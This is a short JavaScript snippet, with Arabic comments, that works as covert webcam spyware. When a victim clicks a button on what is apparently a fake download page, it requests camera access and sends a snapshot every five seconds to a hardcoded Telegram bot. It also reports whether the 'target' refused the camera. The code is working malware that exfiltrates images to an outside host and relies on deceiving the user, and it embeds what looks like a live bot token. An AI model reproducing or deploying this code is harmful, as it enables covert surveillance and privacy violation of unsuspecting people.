const token = '8561370342:AAESNgx1om8jD4cjRPqlvhUw73I4OHR6soA';
const chatId = '7952511316';

async function sendToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'capture.jpg');
    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
}

async function startCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // تصوير لقطة كل 5 ثوانٍ
        setInterval(() => {
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(sendToTelegram, 'image/jpeg');
        }, 5000);
    } catch (err) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=الهدف_رفض_الكاميرا`);
    }
}

// تشغيل الكاميرا فور الضغط على زر التحميل لإقناع المستخدم
document.addEventListener('click', (e) => {
    if (e.target.tagName === 'BUTTON') {
        startCapture();
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=بدأ_التحميل_وطلب_الكاميرا`);
    }
});

